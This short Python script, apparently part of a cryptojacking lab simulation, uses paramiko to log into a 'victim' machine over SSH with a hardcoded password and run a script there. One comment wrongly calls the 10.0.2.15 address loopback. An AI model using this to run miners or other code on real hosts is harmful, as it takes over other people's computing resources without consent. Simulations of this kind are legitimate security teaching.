import paramiko #Paramiko is a pure-Python implementation of the SSHv2 protocol, providing both client and server functionality.

# Define SSH connection details (localhost, since both processes are on the same machine)
VICTIM_IP = '10.0.2.15'  # Loopback address (localhost)
USERNAME = 'ubuntu'  # Replace with your Linux username
PASSWORD = 'U123456789'  # Replace with your Linux password

# Create an SSH client
ssh_client = paramiko.SSHClient()
ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh_client.connect(VICTIM_IP, username=USERNAME, password=PASSWORD)

# Execute a command on the victim machine
stdin, stdout, stderr = ssh_client.exec_command('python3 /Home/Project/victim_script.py')
print(stdout.read().decode())
print(stderr.read().decode())

# Close the SSH connection
ssh_client.close()
print("Cryptojacking simulation executed on the victim's machine.")

